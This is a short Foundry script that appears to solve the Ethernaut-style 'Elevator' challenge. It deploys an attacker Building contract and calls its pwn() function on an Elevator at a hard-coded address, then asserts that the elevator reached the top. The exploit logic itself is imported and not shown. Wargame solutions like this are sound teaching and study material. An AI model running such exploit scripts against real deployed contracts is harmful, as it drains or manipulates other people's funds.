// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";

import {Building} from "../src/elevator/Building.sol";
import {Elevator} from "../src/elevator/Elevator.sol";

contract ElevatorScript is Script {
    uint playerKey;
    address playerAddr;
    Elevator elevator;

    function setUp() public {
        elevator = Elevator(0x0B129e5719B3a8F986d54D6998226fE7fcC2b187);
        playerKey = vm.envUint("PRIVATE_KEY");
        playerAddr = vm.addr(playerKey);
    }

    function run() public {
        vm.startBroadcast(playerKey);

        Building building = new Building();

        building.pwn(elevator);
        require(elevator.top(), "Elevator is not at the top floor");
    }
}
